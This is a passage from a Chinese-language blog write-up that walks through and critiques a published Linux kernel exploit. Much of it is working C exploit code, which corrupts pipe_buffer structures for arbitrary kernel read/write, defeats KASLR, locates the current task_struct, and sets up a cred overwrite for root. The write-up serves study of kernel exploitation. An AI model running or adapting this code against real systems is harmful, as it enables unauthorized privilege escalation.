class="line">write(pipe_fd[victim_pid][<span class="number">1</span>], &amp;info_pipe_buf, <span class="keyword">sizeof</span>(info_pipe_buf));</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++) &#123;</span><br><span class="line">    <span class="type">int</span> nr;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (i == orig_pid || i == victim_pid) &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    read(pipe_fd[i][<span class="number">0</span>], &amp;nr, <span class="keyword">sizeof</span>(nr));</span><br><span class="line">    <span class="keyword">if</span> (nr &lt; PIPE_SPRAY_NUM &amp;&amp; i != nr) &#123;</span><br><span class="line">        snd_orig_pid = nr;</span><br><span class="line">        snd_vicitm_pid = i;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found second-level victim: \033[0m%d &quot;</span></span><br><span class="line">               <span class="string">&quot;\033[32m\033[1m, orig: \033[0m%d\n&quot;</span>, </span><br><span class="line">               snd_vicitm_pid, snd_orig_pid);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (snd_vicitm_pid == <span class="number">-1</span>) &#123;</span><br><span class="line">    err_exit(<span class="string">&quot;FAILED to corrupt second-level pipe_buffer!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意这一句</p><p><code>info_pipe_buf.page = (struct page*) ((size_t) info_pipe_buf.page + 0x40);</code></p><p><code>arttnba3</code>大佬将page指针+0x40之后才将其写到下一个pipe_buffer</p><p>而我认为这是没有必要的,甚至加了这一句之后其实反而不太好理解了,甚至如果不是random_list的作用,还可能下一个pipe_buffer的page本身就是读出的page指针+0x40</p><p>所以这一句代码是完全可以去除的,而我在去除后编译出的exp同样利用成功了,证实了我的猜测</p><h3 id="构建自写管道"><a href="#构建自写管道" class="headerlink" title="构建自写管道"></a>构建自写管道</h3><p>现在我们拥有了对应第二个uaf页的<code>struct page</code>指针</p><p>并且还能任意写第二个uaf页上的pipe_buffer结构体</p><p>那么不是可以控制其上的pipe_buffer指向自身所在页,进而控制pipe_buffer本身</p><p>这里我们需要控制三个pipe_buffer</p><p>从低到高我们分别称作A,B,C,</p><p>其中</p><ul><li>A用于任意读写</li><li>C负责控制A任意读写的范围,并在写完A后,向后移继续写B,使得B指向C</li><li>B负责将C重新指向A</li></ul><p>获取这三个pipe_buffer的方法和前面两步差不多,就不多说了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">building_self_writing_pipe</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> buf[<span class="number">0x1000</span>];</span><br><span class="line">    <span class="type">size_t</span> trd_pipe_sz = <span class="number">0x1000</span> * (TRD_PIPE_BUF_SZ/<span class="keyword">sizeof</span>(<span class="keyword">struct</span> pipe_buffer));</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> <span class="title">evil_pipe_buf</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page_ptr</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* let the page&#x27;s ptr at pipe_buffer */</span></span><br><span class="line">    write(pipe_fd[snd_vicitm_pid][<span class="number">1</span>], buf, TRD_PIPE_BUF_SZ - <span class="number">24</span> <span class="number">-3</span>*<span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* free orignal pipe&#x27;s page */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] free second-level original pipe...&quot;</span>);</span><br><span class="line">    close(pipe_fd[snd_orig_pid][<span class="number">0</span>]);</span><br><span class="line">    close(pipe_fd[snd_orig_pid][<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* try to rehit victim page by reallocating pipe_buffer */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] fcntl() to set the pipe_buffer on second-level victim page...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i == orig_pid || i == victim_pid </span><br><span class="line">            || i == snd_orig_pid || i == snd_vicitm_pid) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (fcntl(pipe_fd[i][<span class="number">1</span>], F_SETPIPE_SZ, trd_pipe_sz) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to resize %d pipe!\n&quot;</span>, i);</span><br><span class="line">            err_exit(<span class="string">&quot;FAILED to re-alloc pipe_buffer!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* let a pipe-&gt;bufs pointing to itself */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] hijacking the 2nd pipe_buffer on page to itself...&quot;</span>);</span><br><span class="line">    evil_pipe_buf.page = info_pipe_buf.page;</span><br><span class="line">    evil_pipe_buf.offset = TRD_PIPE_BUF_SZ;</span><br><span class="line">    evil_pipe_buf.len = TRD_PIPE_BUF_SZ;</span><br><span class="line">    evil_pipe_buf.ops = info_pipe_buf.ops;</span><br><span class="line">    evil_pipe_buf.flags = info_pipe_buf.flags;</span><br><span class="line">    evil_pipe_buf.private = info_pipe_buf.private;</span><br><span class="line"></span><br><span class="line">    write(pipe_fd[snd_vicitm_pid][<span class="number">1</span>], &amp;evil_pipe_buf, <span class="keyword">sizeof</span>(evil_pipe_buf));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* check for third-level victim pipe */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i == orig_pid || i == victim_pid </span><br><span class="line">            || i == snd_orig_pid || i == snd_vicitm_pid) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        read(pipe_fd[i][<span class="number">0</span>], &amp;page_ptr, <span class="keyword">sizeof</span>(page_ptr));</span><br><span class="line">        <span class="keyword">if</span> (page_ptr == evil_pipe_buf.page) &#123;</span><br><span class="line">            self_2nd_pipe_pid = i;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found self-writing pipe: \033[0m%d\n&quot;</span>, </span><br><span class="line">                    self_2nd_pipe_pid);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (self_2nd_pipe_pid == <span class="number">-1</span>) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to build a self-writing pipe!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* overwrite the 3rd pipe_buffer to this page too */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] hijacking the 3rd pipe_buffer on page to itself...&quot;</span>);</span><br><span class="line">    evil_pipe_buf.offset = TRD_PIPE_BUF_SZ;</span><br><span class="line">    evil_pipe_buf.len = TRD_PIPE_BUF_SZ;</span><br><span class="line"></span><br><span class="line">    write(pipe_fd[snd_vicitm_pid][<span class="number">1</span>],buf,TRD_PIPE_BUF_SZ-<span class="keyword">sizeof</span>(evil_pipe_buf));</span><br><span class="line">    write(pipe_fd[snd_vicitm_pid][<span class="number">1</span>], &amp;evil_pipe_buf, <span class="keyword">sizeof</span>(evil_pipe_buf));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* check for third-level victim pipe */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i == orig_pid || i == victim_pid </span><br><span class="line">            || i == snd_orig_pid || i == snd_vicitm_pid</span><br><span class="line">            || i == self_2nd_pipe_pid) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        read(pipe_fd[i][<span class="number">0</span>], &amp;page_ptr, <span class="keyword">sizeof</span>(page_ptr));</span><br><span class="line">        <span class="keyword">if</span> (page_ptr == evil_pipe_buf.page) &#123;</span><br><span class="line">            self_3rd_pipe_pid = i;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found another self-writing pipe:\033[0m&quot;</span></span><br><span class="line">                    <span class="string">&quot;%d\n&quot;</span>, self_3rd_pipe_pid);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (self_3rd_pipe_pid == <span class="number">-1</span>) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to build a self-writing pipe!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* overwrite the 4th pipe_buffer to this page too */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] hijacking the 4th pipe_buffer on page to itself...&quot;</span>);</span><br><span class="line">    evil_pipe_buf.offset = TRD_PIPE_BUF_SZ;</span><br><span class="line">    evil_pipe_buf.len = TRD_PIPE_BUF_SZ;</span><br><span class="line"></span><br><span class="line">    write(pipe_fd[snd_vicitm_pid][<span class="number">1</span>],buf,TRD_PIPE_BUF_SZ-<span class="keyword">sizeof</span>(evil_pipe_buf));</span><br><span class="line">    write(pipe_fd[snd_vicitm_pid][<span class="number">1</span>], &amp;evil_pipe_buf, <span class="keyword">sizeof</span>(evil_pipe_buf));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* check for third-level victim pipe */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_SPRAY_NUM; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i == orig_pid || i == victim_pid </span><br><span class="line">            || i == snd_orig_pid || i == snd_vicitm_pid</span><br><span class="line">            || i == self_2nd_pipe_pid || i== self_3rd_pipe_pid) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        read(pipe_fd[i][<span class="number">0</span>], &amp;page_ptr, <span class="keyword">sizeof</span>(page_ptr));</span><br><span class="line">        <span class="keyword">if</span> (page_ptr == evil_pipe_buf.page) &#123;</span><br><span class="line">            self_4th_pipe_pid = i;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found another self-writing pipe:\033[0m&quot;</span></span><br><span class="line">                    <span class="string">&quot;%d\n&quot;</span>, self_4th_pipe_pid);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (self_4th_pipe_pid == <span class="number">-1</span>) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to build a self-writing pipe!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="任意读写"><a href="#任意读写" class="headerlink" title="任意读写"></a>任意读写</h3><p>之前已经介绍了ABC的作用,以下就是初始化准备过程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">setup_evil_pipe</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* init the initial val for 2nd,3rd and 4th pipe, for recovering only */</span></span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;evil_2nd_buf, &amp;info_pipe_buf, <span class="keyword">sizeof</span>(evil_2nd_buf));</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;evil_3rd_buf, &amp;info_pipe_buf, <span class="keyword">sizeof</span>(evil_3rd_buf));</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;evil_4th_buf, &amp;info_pipe_buf, <span class="keyword">sizeof</span>(evil_4th_buf));</span><br><span class="line"></span><br><span class="line">    evil_2nd_buf.offset = <span class="number">0</span>;</span><br><span class="line">    evil_2nd_buf.len = <span class="number">0xff0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* hijack the 3rd pipe pointing to 4th */</span></span><br><span class="line">    evil_3rd_buf.offset = TRD_PIPE_BUF_SZ * <span class="number">3</span>;</span><br><span class="line">    evil_3rd_buf.len = <span class="number">0</span>;</span><br><span class="line">    write(pipe_fd[self_4th_pipe_pid][<span class="number">1</span>], &amp;evil_3rd_buf, <span class="keyword">sizeof</span>(evil_3rd_buf));</span><br><span class="line"></span><br><span class="line">    evil_4th_buf.offset = TRD_PIPE_BUF_SZ;</span><br><span class="line">    evil_4th_buf.len = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>真正的任意读写封装</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">arbitrary_read_by_pipe</span><span class="params">(<span class="keyword">struct</span> page *page_to_read, <span class="type">void</span> *dst)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* page to read */</span></span><br><span class="line">    evil_2nd_buf.offset = <span class="number">0</span>;</span><br><span class="line">    evil_2nd_buf.len = <span class="number">0x1ff8</span>;</span><br><span class="line">    evil_2nd_buf.page = page_to_read;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* hijack the 4th pipe pointing to 2nd pipe */</span></span><br><span class="line">    write(pipe_fd[self_3rd_pipe_pid][<span class="number">1</span>], &amp;evil_4th_buf, <span class="keyword">sizeof</span>(evil_4th_buf));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* hijack the 2nd pipe for arbitrary read */</span></span><br><span class="line">    write(pipe_fd[self_4th_pipe_pid][<span class="number">1</span>], &amp;evil_2nd_buf, <span class="keyword">sizeof</span>(evil_2nd_buf));</span><br><span class="line">    write(pipe_fd[self_4th_pipe_pid][<span class="number">1</span>], </span><br><span class="line">          temp_zero_buf, </span><br><span class="line">          TRD_PIPE_BUF_SZ-<span class="keyword">sizeof</span>(evil_2nd_buf));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* hijack the 3rd pipe to point to 4th pipe */</span></span><br><span class="line">    write(pipe_fd[self_4th_pipe_pid][<span class="number">1</span>], &amp;evil_3rd_buf, <span class="keyword">sizeof</span>(evil_3rd_buf));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* read out data */</span></span><br><span class="line">    read(pipe_fd[self_2nd_pipe_pid][<span class="number">0</span>], dst, <span class="number">0xfff</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">arbitrary_write_by_pipe</span><span class="params">(<span class="keyword">struct</span> page *page_to_write, <span class="type">void</span> *src, <span class="type">size_t</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* page to write */</span></span><br><span class="line">    evil_2nd_buf.page = page_to_write;</span><br><span class="line">    evil_2nd_buf.offset = <span class="number">0</span>;</span><br><span class="line">    evil_2nd_buf.len = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* hijack the 4th pipe pointing to 2nd pipe */</span></span><br><span class="line">    write(pipe_fd[self_3rd_pipe_pid][<span class="number">1</span>], &amp;evil_4th_buf, <span class="keyword">sizeof</span>(evil_4th_buf));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* hijack the 2nd pipe for arbitrary read, 3rd pipe point to 4th pipe */</span></span><br><span class="line">    write(pipe_fd[self_4th_pipe_pid][<span class="number">1</span>], &amp;evil_2nd_buf, <span class="keyword">sizeof</span>(evil_2nd_buf));</span><br><span class="line">    write(pipe_fd[self_4th_pipe_pid][<span class="number">1</span>], </span><br><span class="line">          temp_zero_buf, </span><br><span class="line">          TRD_PIPE_BUF_SZ - <span class="keyword">sizeof</span>(evil_2nd_buf));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* hijack the 3rd pipe to point to 4th pipe */</span></span><br><span class="line">    write(pipe_fd[self_4th_pipe_pid][<span class="number">1</span>], &amp;evil_3rd_buf, <span class="keyword">sizeof</span>(evil_3rd_buf));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* write data into dst page */</span></span><br><span class="line">    write(pipe_fd[self_2nd_pipe_pid][<span class="number">1</span>], src, len);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="泄露信息"><a href="#泄露信息" class="headerlink" title="泄露信息"></a>泄露信息</h3><p>我们现在已经拥有了任意读写的能力</p><p>泄露kernel text</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * KASLR&#x27;s granularity is 256MB, and pages of size 0x1000000 is 1GB MEM,</span></span><br><span class="line"><span class="comment"> * so we can simply get the vmemmap_base like this in a SMALL-MEM env.</span></span><br><span class="line"><span class="comment"> * For MEM &gt; 1GB, we can just find the secondary_startup_64 func ptr,</span></span><br><span class="line"><span class="comment"> * which is located on physmem_base + 0x9d000, i.e., vmemmap_base[156] page.</span></span><br><span class="line"><span class="comment"> * If the func ptr is not there, just vmemmap_base -= 256MB and do it again.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">vmemmap_base = (<span class="type">size_t</span>) info_pipe_buf.page &amp; <span class="number">0xfffffffff0000000</span>;</span><br><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line">    arbitrary_read_by_pipe((<span class="keyword">struct</span> page*) (vmemmap_base + <span class="number">157</span> * <span class="number">0x40</span>), buf);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (buf[<span class="number">0</span>] &gt; <span class="number">0xffffffff81000000</span> &amp;&amp; ((buf[<span class="number">0</span>] &amp; <span class="number">0xfff</span>) == <span class="number">0x070</span>)) &#123;</span><br><span class="line">        kernel_base = buf[<span class="number">0</span>] -  <span class="number">0x070</span>;</span><br><span class="line">        kernel_offset = kernel_base - <span class="number">0xffffffff81000000</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found kernel base: \033[0m0x%lx\n&quot;</span></span><br><span class="line">               <span class="string">&quot;\033[32m\033[1m[+] Kernel offset: \033[0m0x%lx\n&quot;</span>, </span><br><span class="line">               kernel_base, kernel_offset);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    vmemmap_base -= <span class="number">0x10000000</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] vmemmap_base:\033[0m 0x%lx\n\n&quot;</span>, vmemmap_base);</span><br></pre></td></tr></table></figure><p>0x9d000/0x1000=157</p><p>至于开头那段注释,可能是我理解能力不够强,按照我的理解似乎是有点问题的</p><p><code>arttnba3</code>大佬提到kaslr的粒度是256m,但是<code>and pages of size 0x1000000 is 1GB MEM</code>中的<code>0x1000000</code>显然不是256m,之后的代码以及<code>just vmemmap_base -= 256MB</code>与之都对不上</p><p>所以个人觉得应该是<code>artnba3</code>大佬写错了,按照这个思路其实只有当<code>MEM &gt; 16GB</code>时才有必要利用这个循环</p><hr><p>之后再在内存中搜索task结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">prctl(PR_SET_NAME, <span class="string">&quot;arttnba3pwnn&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * For a machine with MEM less than 256M, we can simply get the:</span></span><br><span class="line"><span class="comment"> *      page_offset_base = heap_leak &amp; 0xfffffffff0000000;</span></span><br><span class="line"><span class="comment"> * But that&#x27;s not always accurate, espacially on a machine with MEM &gt; 256M.</span></span><br><span class="line"><span class="comment"> * So we need to find another way to calculate the page_offset_base.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * Luckily the task_struct::ptraced points to itself, so we can get the</span></span><br><span class="line"><span class="comment"> * page_offset_base by vmmemap and current task_struct as we know the page.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * Note that the offset of different filed should be referred to your env.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; <span class="number">1</span>; i++) &#123;</span><br><span class="line">    arbitrary_read_by_pipe((<span class="keyword">struct</span> page*) (vmemmap_base + i * <span class="number">0x40</span>), buf);</span><br><span class="line"></span><br><span class="line">    comm_addr = memmem(buf, <span class="number">0xf00</span>, <span class="string">&quot;arttnba3pwnn&quot;</span>, <span class="number">12</span>);</span><br><span class="line">    <span class="keyword">if</span> (comm_addr &amp;&amp; (comm_addr[<span class="number">-2</span>] &gt; <span class="number">0xffff888000000000</span>) <span class="comment">/* task-&gt;cred */</span></span><br><span class="line">        &amp;&amp; (comm_addr[<span class="number">-3</span>] &gt; <span class="number">0xffff888000000000</span>) <span class="comment">/* task-&gt;real_cred */</span></span><br><span class="line">        &amp;&amp; (comm_addr[<span class="number">-57</span>] &gt; <span class="number">0xffff888000000000</span>) <span class="comment">/* task-&gt;read_parent */</span></span><br><span class="line">        &amp;&amp; (comm_addr[<span class="number">-56</span>] &gt; <span class="number">0xffff888000000000</span>)) &#123;  <span class="comment">/* task-&gt;parent */</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* task-&gt;read_parent */</span></span><br><span class="line">        parent_task = comm_addr[<span class="number">-57</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* task_struct::ptraced */</span></span><br><span class="line">        current_task = comm_addr[<span class="number">-50</span>] - <span class="number">2528</span>;</span><br><span class="line"></span><br><span class="line">        page_offset_base = (comm_addr[<span class="number">-50</span>]&amp;<span class="number">0xfffffffffffff000</span>) - i * <span class="number">0x1000</span>;<span class="comment">//直接映射区的首页</span></span><br><span class="line">        page_offset_base &amp;= <span class="number">0xfffffffff0000000</span>;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found task_struct on page: \033[0m%p\n&quot;</span>,</span><br><span class="line">               (<span class="keyword">struct</span> page*) (vmemmap_base + i * <span class="number">0x40</span>));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] page_offset_base: \033[0m0x%lx\n&quot;</span>,</span><br><span class="line">               page_offset_base);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] current task_struct&#x27;s addr: \033[0m&quot;</span></span><br><span class="line">               <span class="string">&quot;0x%lx\n\n&quot;</span>, current_task);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><code>arttnba3</code>师傅提供了三种提权的方法,其中有两种并不常见</p><p>我们一一解读一下</p><h3 id="修改cred"><a href="#修改cred" class="headerlink" title="修改cred"></a>修改cred</h3><p>第一种是较为常见的修改当前进程的task_struct结构体,一般两种形式</p><ul><li>修改<code>task_struct-&gt;cred</code>为<code>&amp;init_cred</code></li><li>修改<code>task_struct-&gt;cred-&gt;uid和euid</code>为<code>0</code></li></ul><p>arttnba3大佬选择的是第一种方法</p><p>由于 